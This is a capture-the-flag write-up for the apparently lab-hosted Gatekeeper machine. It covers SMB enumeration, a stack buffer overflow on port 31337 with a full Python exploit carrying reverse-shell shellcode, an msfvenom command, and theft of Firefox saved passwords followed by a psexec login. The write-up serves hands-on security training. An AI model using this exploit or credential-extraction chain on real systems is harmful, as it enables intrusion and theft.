/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 2200 > pattern.txt
# PORT SCAN
---

| PORT | SERVICE |
| --------- | ------------- |
| 135/tcp | msrpc |
| 139/tcp | netbios-ssn |
| 445/tcp | microsoft-ds |
| 3389/tcp | ms-wbt-server |
| 31337/tcp | Elite? |
| 49152/tcp | msrpc |
| 49153/tcp | msrpc |
| 49154/tcp | msrpc |
| 49160/tcp | msrpc |
| 49161/tcp | msrpc |
| 49163/tcp | msrpc |



# RECONNAISSANCE
---


As seen, we got `SMV` enabled, let's use `smbclient` to connect anonymously:

```
smbclient -L \\\\10.10.145.109\\ -N
Can't load /etc/samba/smb.conf - run testparm to debug it

	Sharename Type Comment
	--------- ---- -------
	ADMIN$ Disk Remote Admin
	C$ Disk Default share
	IPC$ IPC Remote IPC
	Users Disk
SMB1 disabled -- no workgroup available
```


We got an `Users` share:

```
smbclient //10.10.145.109/Users -N
Can't load /etc/samba/smb.conf - run testparm to debug it
Try "help" to get a list of possible commands.
smb: \> ls
 . DR 0 Fri May 15 01:57:08 2020
 .. DR 0 Fri May 15 01:57:08 2020
 Default DHR 0 Tue Jul 14 07:07:31 2009
 desktop.ini AHS 174 Tue Jul 14 04:54:24 2009
 Share D 0 Fri May 15 01:58:07 2020

		7863807 blocks of size 4096. 3876413 blocks available
smb: \> cd Share
smb: \Share\> dir
 . D 0 Fri May 15 01:58:07 2020
 .. D 0 Fri May 15 01:58:07 2020
 gatekeeper.exe A 13312 Mon Apr 20 05:27:17 2020

		7863807 blocks of size 4096. 3876413 blocks available
```


As seen, we got a `gatekeeper.exe` file, we can get this file into our machine:


```
smb: \Share\> get gatekeeper.exe
getting file \Share\gatekeeper.exe of size 13312 as gatekeeper.exe (18.5 KiloBytes/sec) (average 18.5 KiloBytes/sec)
```


By testing the open ports with netcat, we can see this on port `31337`:

```
nc 10.10.145.109 31337
help
Hello help!!!
```

This is vulnerable to buffer overflow, we can now this by generating characters with python and submitting them into the nc port:

```
python -c "print('A'*1000)"
```


![Pasted image 20250530170602.png](../../IMAGES/Pasted%20image%2020250530170602.png)

As seen, the program crashes automatically, with all these, we can use `immunity debugger` to construct our exploit.


# EXPLOITATION
---

Since the process is pretty much the same as the `Buffer Overflow Prep Room`, we can save a lot of time by doing this simple steps inside of immunity debugger on a self windows 7 machine or even the machine provided by that room, for the sake of simplicity, refer to my writeup for the `Buffer Overflow Prep Room` machine or simply modify this exploit, if you don't want to check but do it manually, you need to follow these steps:

#### 1. Test for a crash with a basic fuzzing payload

Send a large number of characters to see if the service crashes:

```
python -c "print('A'*1000)"
```

#### 2. Move the binary to a Windows machine for debugging

Transfer the vulnerable binary to a Windows 7 VM and open it using **Immunity Debugger** to monitor behavior and track the EIP register.

#### 3. Generate a unique pattern to identify the offset

Use Metasploitâ€™s `pattern_create.rb` tool to generate a 1000-character unique pattern:

```
/opt/metasploit-framework-5101/tools/exploit/pattern_create.rb -l 1000
```

Note: The path may vary depending on your system, sometimes found in `/usr/share/metasploit-framework/tools/exploit/`.

#### 4. Send the pattern and crash the service

Use the generated pattern in your payload and crash the service to overwrite the EIP. Take note of the EIP value after the crash.

#### 5. Find the exact offset to EIP

Use Monaâ€™s `findmsp` command to locate the offset where EIP is overwritten:

```
!mona findmsp -distance 1000
```


Result: Exact offset found at **146 bytes**.


#### 6. Confirm EIP control

Edit your exploit script to send:

- 146 bytes of junk (`"A"*146`)
- Followed by `"BBBB"` (to observe `42424242` in EIP)

If EIP is overwritten with `42424242`, you have control.

#### 7. Identify bad characters

Generate a byte array excluding `\x00` (null byte) by default:

```
!mona bytearray -b "\x00"
```


Send the byte array in your payload and compare it in Mona:

```
!mona compare -f c:\mona\gatekeeper\bytearray.bin -a <ESP_ADDRESS>
# You can check the esp address at the right side of immunity.
```

Result: Bad characters identified: `\x00`, `\x0a`
Repeat the process, excluding each new bad character, until Mona returns "Unmodified".

#### 8. Find a `JMP ESP` address

Search for a `JMP ESP` instruction in a module with **ASLR** and **SafeSEH** disabled:

```
!mona jmp -r esp -cpb "\x00\x0a"
```

Copy the safe JMP address found (e.g., `0x625011af`).

#### 9. Generate shellcode with `msfvenom`

Create a reverse shell payload, excluding the bad characters:

```
msfvenom -p windows/shell_reverse_tcp LHOST=LPORT=4444 -b "\x00\x0A" -f c -e x86/shikata_ga_nai
```

#### 10. Build the final exploit

#### 11. Launch the attack.



Here's the final script you should have, 

```python
#!/usr/bin/env python3

import socket

# Target configuration
ip = "10.10.145.109" # Change with TARGET IP
port = 31337

# Exploit parameters
prefix = "" # Command prefix
offset = 146 # Offset to EIP
overflow= "A" * offset # Filler to reach EIP
retn = "\xc3\x14\x04\x08" # Return address: jmp esp (little endian)
padding = "\x90" * 16 # NOP sled

# Shellcode: msfvenom generated payload, do it with: msfvenom -p windows/shell_reverse_tcp LHOST=IP LPORT=4444 EXITFUNC=thread -b "\x00\x0a" -f c
payload = (
 "\xda\xc1\xba\xb2\xb0\xc7\x8a\xd9\x74\x24\xf4\x5d\x33\xc9"
 "\xb1\x52\x31\x55\x17\x03\x55\x17\x83\x77\xb4\x25\x7f\x8b"
 "\x5d\x2b\x80\x73\x9e\x4c\x08\x96\xaf\x4c\x6e\xd3\x80\x7c"
 "\xe4\xb1\x2c\xf6\xa8\x21\xa6\x7a\x65\x46\x0f\x30\x53\x69"
 "\x90\x69\xa7\xe8\x12\x70\xf4\xca\x2b\xbb\x09\x0b\x6b\xa6"
 "\xe0\x59\x24\xac\x57\x4d\x41\xf8\x6b\xe6\x19\xec\xeb\x1b"
 "\xe9\x0f\xdd\x8a\x61\x56\xfd\x2d\xa5\xe2\xb4\x35\xaa\xcf"
 "\x0f\xce\x18\xbb\x91\x06\x51\x44\x3d\x67\x5d\xb7\x3f\xa0"
 "\x5a\x28\x4a\xd8\x98\xd5\x4d\x1f\xe2\x01\xdb\xbb\x44\xc1"
 "\x7b\x67\x74\x06\x1d\xec\x7a\xe3\x69\xaa\x9e\xf2\xbe\xc1"
 "\x9b\x7f\x41\x05\x2a\x3b\x66\x81\x76\x9f\x07\x90\xd2\x4e"
 "\x37\xc2\xbc\x2f\x9d\x89\x51\x3b\xac\xd0\x3d\x88\x9d\xea"
 "\xbd\x86\x96\x99\x8f\x09\x0d\x35\xbc\xc2\x8b\xc2\xc3\xf8"
 "\x6c\x5c\x3a\x03\x8d\x75\xf9\x57\xdd\xed\x28\xd8\xb6\xed"
 "\xd5\x0d\x18\xbd\x79\xfe\xd9\x6d\x3a\xae\xb1\x67\xb5\x91"
 "\xa2\x88\x1f\xba\x49\x73\xc8\xcf\x83\x6e\x14\xb8\x99\x90"
 "\x35\x64\x17\x76\x5f\x84\x71\x21\xc8\x3d\xd8\xb9\x69\xc1"
 "\xf6\xc4\xaa\x49\xf5\x39\x64\xba\x70\x29\x11\x4a\xcf\x13"
 "\xb4\x55\xe5\x3b\x5a\xc7\x62\xbb\x15\xf4\x3c\xec\x72\xca"
 "\x34\x78\x6f\x75\xef\x9e\x72\xe3\xc8\x1a\xa9\xd0\xd7\xa3"
 "\x3c\x6c\xfc\xb3\xf8\x6d\xb8\xe7\x54\x38\x16\x51\x13\x92"
 "\xd8\x0b\xcd\x49\xb3\xdb\x88\xa1\x04\x9d\x94\xef\xf2\x41"
 "\x24\x46\x43\x7e\x89\x0e\x43\x07\xf7\xae\xac\xd2\xb3\xcf"
 "\x4e\xf6\xc9\x67\xd7\x93\x73\xea\xe8\x4e\xb7\x13\x6b\x7a"
 "\x48\xe0\x73\x0f\x4d\xac\x33\xfc\x3f\xbd\xd1\x02\x93\xbe"
 "\xf3"
)

postfix = ""

# Build and send the buffer
buffer = prefix + overflow + retn + padding + payload + postfix

print(f"[+] Connecting to {ip}:{port}...")
with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
 s.connect((ip, port))
 print(f"[+] Sending {len(buffer)} bytes payload...")
 s.send(buffer.encode('latin-1') + b"\r\n")
 print("[+] Payload sent.")

print("[+] Done. Check your listener for a shell!")

```

We need to start a listener and launch the exploit:

![Pasted image 20250530172927.png](../../IMAGES/Pasted%20image%2020250530172927.png)

We got access as user `natbat`, let's get our user flag and begin privilege escalation:

```
C:\Users\natbat\Desktop>type user.txt.txt
{H4lf_W4y_Th3r3}

The buffer overflow in this room is credited to Justin Steven and his
"dostackbufferoverflowgood" program. Thank you!
```


Let's begin privilege escalation.


# PRIVILEGE ESCALATION
---


First thing we can notice on this machine is that we have direct access on our desktop for `firefox`, this is not usual and could lead us to check if there's any password or something like that on there:

![Pasted image 20250530173250.png](../../IMAGES/Pasted%20image%2020250530173250.png)

We can go to:

```
C:\Users\natbat\AppData\Roaming\Mozilla\Firefox\Profiles\
```

![Pasted image 20250530173333.png](../../IMAGES/Pasted%20image%2020250530173333.png)

We got a `ljfn812a.default-release` directory, this directory contains login information for the browser, if we check the contents of this directory, we can find this:

```
Directory of C:\Users\natbat\AppData\Roaming\Mozilla\Firefox\Profiles\ljfn812a.default-release

05/14/2020 10:45 PM <DIR> .
05/14/2020 10:45 PM <DIR> ..
05/14/2020 10:30 PM 24 addons.json
05/14/2020 10:23 PM 1,952 addonStartup.json.lz4
05/14/2020 10:45 PM 0 AlternateServices.txt
05/14/2020 10:30 PM <DIR> bookmarkbackups
05/14/2020 10:24 PM 216 broadcast-listeners.json
04/22/2020 12:47 AM 229,376 cert9.db
04/21/2020 05:00 PM 220 compatibility.ini
04/21/2020 05:00 PM 939 containers.json
04/21/2020 05:00 PM 229,376 content-prefs.sqlite
05/14/2020 10:45 PM 524,288 cookies.sqlite
05/14/2020 10:24 PM <DIR> crashes
05/14/2020 10:45 PM <DIR> datareporting
04/21/2020 05:00 PM 1,111 extension-preferences.json
04/21/2020 05:00 PM <DIR> extensions
05/14/2020 10:34 PM 39,565 extensions.json
05/14/2020 10:45 PM 5,242,880 favicons.sqlite
05/14/2020 10:39 PM 196,608 formhistory.sqlite
04/21/2020 10:50 PM <DIR> gmp-gmpopenh264
04/21/2020 10:50 PM <DIR> gmp-widevinecdm
04/21/2020 05:00 PM 540 handlers.json
04/21/2020 05:02 PM 294,912 key4.db
05/14/2020 10:43 PM 600 logins.json
04/21/2020 05:00 PM <DIR> minidumps
05/14/2020 10:23 PM 0 parent.lock
05/14/2020 10:25 PM 98,304 permissions.sqlite
04/21/2020 05:00 PM 506 pkcs11.txt
05/14/2020 10:45 PM 5,242,880 places.sqlite
05/14/2020 10:45 PM 11,096 prefs.js
05/14/2020 10:45 PM 65,536 protections.sqlite
05/14/2020 10:45 PM <DIR> saved-telemetry-pings
05/14/2020 10:23 PM 2,715 search.json.mozlz4
05/14/2020 10:45 PM 0 SecurityPreloadState.txt
04/21/2020 10:50 PM <DIR> security_state
05/14/2020 10:45 PM 288 sessionCheckpoints.json
05/14/2020 10:45 PM <DIR> sessionstore-backups
05/14/2020 10:45 PM 12,889 sessionstore.jsonlz4
04/21/2020 05:00 PM 18 shield-preference-experiments.json
05/14/2020 10:45 PM 1,357 SiteSecurityServiceState.txt
04/21/2020 05:00 PM <DIR> storage
05/14/2020 10:45 PM 4,096 storage.sqlite
04/21/2020 05:00 PM 50 times.json
05/14/2020 10:45 PM 0 TRRBlacklist.txt
04/21/2020 05:00 PM <DIR> weave
04/21/2020 05:02 PM 98,304 webappsstore.sqlite
05/14/2020 10:45 PM 140 xulstore.json
```

As seen, we got a `key4.db` and `logins.json` file, investigating through internet, we find a python script that let us retrieve the passwords hidden on those files, it is called `firepwd`, let's get it:

```
git clone https://github.com/lclevy/firepwd.git
```


We need a way to get those files, we can either download `netcat` into the windows machine which is the slowest path, or copy the two files into `C:\Users\Share` and use smbclient to get them:

```
copy key4.db C:\Users\Share\key4.db
copy logins.json C:\Users\Share\logins.json
```

Now, we can get them in `smbclient`:

![Pasted image 20250530174002.png](../../IMAGES/Pasted%20image%2020250530174002.png)

```
get key4.db
get logins.json
```

Now, we can use our script:

```python
pip install -r requirements.txt
pyhton3 firepwd.py
```

We will get this output:

```python
python3 firepwd.py
globalSalt: b'2d45b7ac4e42209a23235ecf825c018e0382291d'
 SEQUENCE {
 SEQUENCE {
 OBJECTIDENTIFIER 1.2.840.113549.1.5.13 pkcs5 pbes2
 SEQUENCE {
 SEQUENCE {
 OBJECTIDENTIFIER 1.2.840.113549.1.5.12 pkcs5 PBKDF2
 SEQUENCE {
 OCTETSTRING b'9e0554a19d22a773d0c5497efe7a80641fa25e2e73b2ddf3fbbca61d801c116d'
 INTEGER b'01'
 INTEGER b'20'
 SEQUENCE {
 OBJECTIDENTIFIER 1.2.840.113549.2.9 hmacWithSHA256
 }
 }
 }
 SEQUENCE {
 OBJECTIDENTIFIER 2.16.840.1.101.3.4.1.42 aes256-CBC
 OCTETSTRING b'b0da1db2992a21a74e7946f23021'
 }
 }
 }
 OCTETSTRING b'a713739460522b20433f7d0b49bfabdb'
 }
clearText b'70617373776f72642d636865636b0202'
password check? True
 SEQUENCE {
 SEQUENCE {
 OBJECTIDENTIFIER 1.2.840.113549.1.5.13 pkcs5 pbes2
 SEQUENCE {
 SEQUENCE {
 OBJECTIDENTIFIER 1.2.840.113549.1.5.12 pkcs5 PBKDF2
 SEQUENCE {
 OCTETSTRING b'f1f75a319f519506d39986e15fe90ade00280879f00ae1e036422f001afc6267'
 INTEGER b'01'
 INTEGER b'20'
 SEQUENCE {
 OBJECTIDENTIFIER 1.2.840.113549.2.9 hmacWithSHA256
 }
 }
 }
 SEQUENCE {
 OBJECTIDENTIFIER 2.16.840.1.101.3.4.1.42 aes256-CBC
 OCTETSTRING b'dbd2424eabcf4be30180860055c8'
 }
 }
 }
 OCTETSTRING b'22daf82df08cfd8aa7692b00721f870688749d57b09cb1965dde5c353589dd5d'
 }
clearText b'86a15457f119f862f8296e4f2f6b97d9b6b6e9cb7a3204760808080808080808'
decrypting login/password pairs
 https://creds.com:b'mayor',b'8CL7O1N78MdrCIsV'
```

![Pasted image 20250530174226.png](../../IMAGES/Pasted%20image%2020250530174226.png)


As seen, we got our credentials:

```
mayor:8CL7O1N78MdrCIsV
```

We can now use `psexec.py` and login with this credentials:

```
python3 psexec.py WORKGROUP/mayor:8CL7O1N78MdrCIsV@IP cmd.exe
```


![Pasted image 20250530174926.png](../../IMAGES/Pasted%20image%2020250530174926.png)

There we go, let's read `root` flag:

![Pasted image 20250530175035.png](../../IMAGES/Pasted%20image%2020250530175035.png)

```
C:\Users\mayor\Desktop> type root.txt.txt
{Th3_M4y0r_C0ngr4tul4t3s_U}
```



![Pasted image 20250530175102.png](../../IMAGES/Pasted%20image%2020250530175102.png)

